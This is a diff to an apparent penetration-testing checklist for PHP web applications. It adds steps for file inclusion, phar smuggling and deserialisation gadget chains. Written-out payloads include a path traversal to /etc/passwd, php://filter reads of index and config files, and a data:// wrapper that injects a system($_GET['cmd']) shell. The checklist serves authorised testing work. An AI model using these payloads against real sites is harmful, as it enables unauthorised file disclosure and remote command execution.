@@ -41,7 +41,12 @@
 - [ ] **PHP web?**
   - [ ] Does URL end in `?q=page/home.php` or similar?
     - [ ] LFI `?q=page/../../../../../../../../../../etc/passwd`
-    - [ ] PHP injection possible? `?page=php://filter/convert.base64-encode/resource=index` or `?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id`
+    - [ ] PHP injection possible? See: `../enumeration/php/include-page-injection.md`
+      - [ ] `?page=php://filter/convert.base64-encode/resource=index`
+      - [ ] `?page=php://filter/convert.base64-encode/resource=config`
+      - [ ] `?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id`
+    - [ ] Can you upload files?
+      - [ ] Can you smuggle a phar and then trigger it with page? See `../infiltration/deserialisation-injection-insecure-deserialisation/php/php-phar-rfi-smuggling.md`
   - [ ] Check `/index.php`
   - [ ] Check `/config.php`
   - [ ] Check `/settings.php`
@@ -69,7 +74,10 @@
       - [ ] Check `/?q=admin`, `/user/login`, `CHANGELOG.txt`
     - **Magento**: Check `/admin`, `/downloader`, `/api`
     - **SharePoint**: Check `/_layouts`, `/_vti_bin`
--
+- [ ] Do you have PHP execution?
+  - [ ] can you run `<?php phpinfo(); ?>`
+  - [ ] can you see list of dangerous functions? See `../infiltration/deserialisation-injection-insecure-deserialisation/php/dangerous-functions.md`
+  - [ ] can you run deserialisationn with gadget chain? See `../infiltration/deserialisation-injection-insecure-deserialisation/php/phpggc.md`
 
 ## Enumeration
 
